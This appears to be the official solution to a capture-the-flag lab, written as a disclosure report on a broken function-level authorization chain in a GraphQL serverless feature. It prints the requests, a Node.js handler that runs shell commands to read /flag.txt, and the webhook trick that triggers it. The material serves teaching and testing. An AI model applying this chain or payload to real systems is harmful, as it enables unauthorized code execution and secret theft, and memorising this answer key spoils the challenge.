# DuckMarket — Official Solution & Disclosure Report

*This document describes the intended solution in the style of a responsible-disclosure report against the DuckMarket platform (Duckurity, Inc.). All requests were executed against a local lab instance at `http://localhost:4000`.*

---

## Executive summary

The DuckMarket "Functions (Preview)" pilot restricts its highest-risk operation — **direct function invocation** — to accounts holding the Functions pilot entitlement. Standard users attempting `invokeFunction` are correctly rejected with `FORBIDDEN`.

However, three functionally-equivalent paths to code execution were shipped **without** the same entitlement check: function **creation**, the staged package **upload/provisioning** flow, and **webhook function destinations** driven by the `USER_CHANGED` event pipeline.

By chaining these three unguarded operations, a standard authenticated account (`daffy@duckurity.example`, ROLE_USER) can register a serverless function, upload arbitrary Node.js code, bind it as a webhook destination for its own profile-update event, and trigger server-side execution through an ordinary profile save. Command output — including the contents of the runtime-only secret file `/flag.txt` — is returned verbatim in the function's `lastInvocation.logs`.

**Impact: full remote code execution inside the managed function runtime as the unprivileged `sbx_duck1051` user, and retrieval of the runtime-resident secret (`DUCK{...}`).**

**Classification: Broken Function Level Authorization (BFLA), OWASP API Security Top 10 — API6:2023.** High severity: any authenticated standard account is affected; no special entitlements or user interaction beyond the attacker's own session is required.

---

## 1. Reconnaissance

### 1.1 The storefront bundle

The storefront at `/` is a static SPA. Its JavaScript bundle (`/assets/app.js`) contains a conventional endpoint map:

```js
var API_CONFIG = {
    catalog: "/api/catalog/products",
    health: "/api/healthz",
    profile: "/api/account/v2/users",
    auth: { login: "/api/auth/login", logout: "/api/auth/logout" },
    integrations: {
      // Preview GraphQL surface used by the integrations console currently in
      // internal testing. Not linked from the storefront yet.
      previewEndpoint: "/api/graphql/preview"
    }
};
```

The `integrations` block references a GraphQL API that is not exposed anywhere in the UI — a leftover for an unshipped feature.

### 1.2 Authentication

```http
POST /api/auth/login HTTP/1.1
Content-Type: application/json

{"email":"daffy@duckurity.example","password":"DuckSeason2024!"}
```

```http
HTTP/1.1 200 OK
Set-Cookie: SESSIONID=9d4b1f116cf717178e274b326c5d85e8; Path=/; HttpOnly; SameSite=Lax; ...
Set-Cookie: XSRF-TOKEN=9d4b1f116cf717178e274b326c5d85e8; Path=/; SameSite=Lax; ...
```

```json
{"user":{"id":"9b7f8a2c-0c7f-4bfa-9d14-ea5ee07d5b3c","email":"daffy@duckurity.example","firstName":"Daffy","lastName":"Dumas","locale":"en-US","role":"ROLE_USER"}}
```

All subsequent mutations must echo the `XSRF-TOKEN` cookie as the `X-XSRF-TOKEN` header (double-submit CSRF pattern).

### 1.3 Schema introspection

```http
POST /api/graphql/preview
Content-Type: application/json
X-XSRF-TOKEN: 9d4b...

{"query":"{ __schema { mutationType { name } types { name } } }"}
```

The preview schema exposes `AccountFunction`, `FunctionInvocation`, `WebhookConfiguration`, `CodeFile` (union of `StagedFile`/`UploadedFile`), and mutations `createAccountFunction`, `deleteAccountFunction`, `invokeFunction`, `createAccountWebhookConfiguration`, `deleteAccountWebhookConfiguration`.

## 2. The chain

### Step 1 — createAccountFunction (succeeds for ROLE_USER)

```http
POST /api/graphql/preview
X-XSRF-TOKEN: 9d4b...

{"query":"mutation($i: CreateAccountFunctionInput!){ createAccountFunction(input: $i){ accountFunction { id status codeFile { __typename ... on StagedFile { uploadLink } } } userErrors { message } } }",
 "variables":{"i":{"name":"order-sync","codeFileName":"package.zip","active":true}}}
```

Response:

```json
{"data":{"createAccountFunction":{"accountFunction":{"id":"ce985ac0-f3f0-4583-8b93-1d9915a1a77e","status":"PENDING_PACKAGE_UPLOAD","codeFile":{"__typename":"StagedFile","uploadLink":"/api/file-management/staged/dcdc3aab2223c57c9869cb65c7392f735690cb03"}},"userErrors":[]}}}
```

No entitlement check is applied here — any authenticated account can register a function.

### Step 2 — package upload

A ZIP containing `package.json` (`main: index.js`) and `index.js`:

```js
const { execSync } = require('child_process');
exports.handler = async (event, ctx) => {
  console.log('whoami: ' + execSync('whoami').toString().trim());
  console.log('secret: ' + execSync('cat /flag.txt').toString().trim());
  return { ok: true };
};
```

```http
PUT /api/file-management/staged/dcdc3aab2223c57c9869cb65c7392f735690cb03
Content-Type: application/zip
X-XSRF-TOKEN: 9d4b...

<ZIP bytes>
```

```json
{"status":"PROVISIONING","message":"Package accepted. Provisioning has started."}
```

After ~2 seconds:

```json
{"data":{"function":{"id":"ce985ac0-f3f0-4583-8b93-1d9915a1a77e","status":"READY","runtime":"nodejs22.x"}}}
```

Again, no entitlement check — provisioning (arbitrary code deployment into the managed runtime) is open to any function owner.

### Step 3 — the dead end: invokeFunction is correctly guarded

```http
POST /api/graphql/preview
X-XSRF-TOKEN: 9d4b...

{"query":"mutation{ invokeFunction(id: \"ce985ac0-...\"){ invocation { id } userErrors { message } } }"}
```

```json
{"data":{"invokeFunction":{"invocation":null,"userErrors":[{"message":"FORBIDDEN: invoking account functions requires the Functions pilot entitlement","path":["id"]}]}}}
```

This is the correct behavior for a standard account. The bug is that this exact check is missing on the other paths.

### Step 4 — webhook destination

```http
POST /api/graphql/preview
X-XSRF-TOKEN: 9d4b...

{"query":"mutation($i: CreateAccountWebhookConfigurationInput!){ createAccountWebhookConfiguration(input: $i){ webhookConfiguration { id status destination { functionId } } userErrors { message } } }",
 "variables":{"i":{"resourceType":"USER","resourceActions":["CHANGED"],"destination":{"functionId":"ce985ac0-..."}}}}
```

```json
{"data":{"createAccountWebhookConfiguration":{"webhookConfiguration":{"id":"3a98f342-1cc8-4c41-af74-2e3d135622e5","status":"ACTIVE","resourceType":"USER","resourceActions":["CHANGED],"destination":{"functionId":"ce985ac0-..."}},"userErrors":[]}}}
```

No entitlement check — a standard account can bind its function as an event destination.

### Step 5 — trigger via ordinary product usage

```http
PUT /api/account/v2/users/9b7f8a2c-0c7f-4bfa-9d14-ea5ee07d5b3c
Content-Type: application/json
X-XSRF-TOKEN: 9d4b...

{"firstName":"Daffy","lastName":"Dumas","locale":"en-GB"}
```

```json
{"user":{"id":"9b7f8a2c-...","email":"daffy@duckurity.example","firstName":"Daffy","lastName":"Dumas","locale":"en-GB","role":"ROLE_USER"}}
```

The platform emits `USER_CHANGED` (~1s later), finds the ACTIVE webhook configuration for the account, and executes the destination function in the managed runtime — **no entitlement check**.

### Step 6 — collect the results

```http
POST /api/graphql/preview
X-XSRF-TOKEN: 9d4b...

{"query":"{ function(id: \"ce985ac0-...\"){ lastInvocation { successful error logs { timestamp message } } } }"}
```

```json
{"data":{"function":{"lastInvocation":{"successful":true,"error":null,"logs":[
  {"timestamp":"2026-09-09T18:22:41.117Z","message":"whoami: sbx_duck1051"},
  {"timestamp":"2026-09-09T18:22:41.121Z","message":"secret: DUCK{...redacted in this report...}"}
]}}}}
```

**Flag recovered: `DUCK{...}`** (the value injected via the stack's `FLAG` environment variable).

## 3. Root cause analysis

`platform/src/lib/entitlements.js` implements the Functions pilot entitlement and `invokeFunction` enforces it (resolvers.js, `invokeFunction` mutation). The same enforcement was never applied to:

| Operation | Resolver / path | Entitlement check |
|---|---|---|
| `invokeFunction` | `graphql/resolvers.js` | **YES** (FORBIDDEN for standard users) |
| `createAccountFunction` | `graphql/resolvers.js` | **NO** |
| staged ZIP upload + provisioning | `routes/stagedUpload.js` | **NO** |
| `createAccountWebhookConfiguration` (function destination) | `graphql/resolvers.js` | **NO** |
| USER_CHANGED event-driven execution | `lib/events.js` | **NO** |

The entitlement was designed as the gate for "executing account functions," but only the direct-invocation path was wired to it. The creation, provisioning and event pipelines — built for the integrations console by a different team — never call `hasFunctionsEntitlement()`. The result is an authorization inconsistency across five equivalent paths to the same capability.

## 4. Impact assessment

| Dimension | Assessment |
|---|---|
| Confidentiality | Arbitrary file read within the runtime container (as `sbx_duck1051`), including the runtime-resident secret |
| Integrity | Arbitrary code execution in the platform's compute tier; tampering with runtime workspace state |
| Availability | Attacker-controlled code consumes runtime CPU (bounded by the 5s timeout) |
| Lateral movement | Low — the runtime has no published ports, no host Docker socket, and no credentials for other services; egress is not required for the impact above |
| Affected accounts | **Every standard authenticated account** — the documented customer account suffices |
| Authentication required | Yes (standard user); no user interaction |

CVSS v3.1 base estimate: **8.8 (High)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H. The score assumes the runtime is single-purpose and unprivileged; any deployment where the runtime holds additional secrets or network reachability raises it.

## 5. Reproduction

Automated end-to-end reproduction (standard library only):

```bash
python3 solution/solve.py
```

The script performs all steps above, deliberately printing the FORBIDDEN response at the direct-invocation step, and finishes with the recovered flag.

## 6. Fix

See `solution/REMEDIATION.md` for the full remediation plan.
